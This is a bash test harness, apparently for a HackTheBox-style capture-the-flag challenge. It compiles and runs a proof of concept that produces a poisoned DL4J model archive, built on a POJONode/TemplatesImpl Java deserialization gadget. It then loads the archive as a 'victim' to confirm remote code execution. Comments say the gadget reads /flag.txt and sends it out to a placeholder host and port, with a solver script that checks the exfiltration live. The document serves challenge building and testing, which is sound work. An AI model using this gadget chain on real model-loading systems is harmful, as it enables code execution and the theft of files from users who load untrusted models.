#!/bin/bash
# Runs INSIDE the maven:3.9-eclipse-temurin-11 container.
# DL4J-scoped POJONode/TemplatesImpl gadget on Java 11 — no --add-opens needed.
set -u
cd /payload

mkdir -p /work/out
echo 'HTB{t3st_dl4j_pr3pr0c3ss0r_d3s3r}' > /work/out/flag.txt

echo "######## java ########"
java -version 2>&1 | head -1

echo "######## compile ########"
mvn -q -B compile || { echo "COMPILE FAILED"; exit 1; }

echo "######## generate poisoned model ########"
rm -f /tmp/.sig_ran
mvn -q -B exec:java \
  -Dexec.mainClass=local.poc.SignetryPayload \
  -Dexec.args="/work/out/model-rce.zip /work/out/flag.txt /work/out/blob.bin" \
  || { echo "GENERATE FAILED"; exit 1; }

echo
echo "######## victim: validate + restore (stock JVM, no flags) ########"
# The gadget reads /flag.txt and network-exfils to the baked placeholder host:port
# (default 127.0.0.1:9001). Offline there is no listener, so exfil fails silently;
# the /tmp/.sig_ran marker proves the translet ctor ran (RCE). Full network exfil is
# verified end-to-end by htb/solver.py against the live container.
mvn -q -B exec:java \
  -Dexec.mainClass=local.poc.VictimLoad -Dexec.args="/work/out/model-rce.zip" 2>&1 | grep -vE "^SLF4J" | tail -20
echo "--- signals ---"
[ -f /tmp/.sig_ran ] && echo "CTOR_RAN: yes  <-- RCE OK (translet ctor executed)" || echo "CTOR_RAN: no"
echo "######## DONE ########"
